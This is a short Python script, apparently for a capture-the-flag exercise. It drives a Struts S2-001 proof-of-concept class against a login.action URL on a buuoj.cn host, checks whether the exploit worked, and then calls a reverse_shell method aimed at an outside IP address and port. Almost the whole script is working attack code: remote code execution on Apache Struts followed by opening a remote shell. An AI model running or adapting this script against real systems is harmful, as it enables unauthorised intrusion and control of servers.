# coding: utf-8
'''
Created on 2020年5月25日

@author: raytine
'''
from poc.struts.S2001 import Struts001

struts001 = Struts001("http://node3.buuoj.cn:29220/login.action")
res = struts001.sendRequest()
print(res)
res = struts001.checkRsult(res)
print(res)
res = struts001.reverse_shell("119.45.5.63", 9998)
print(res)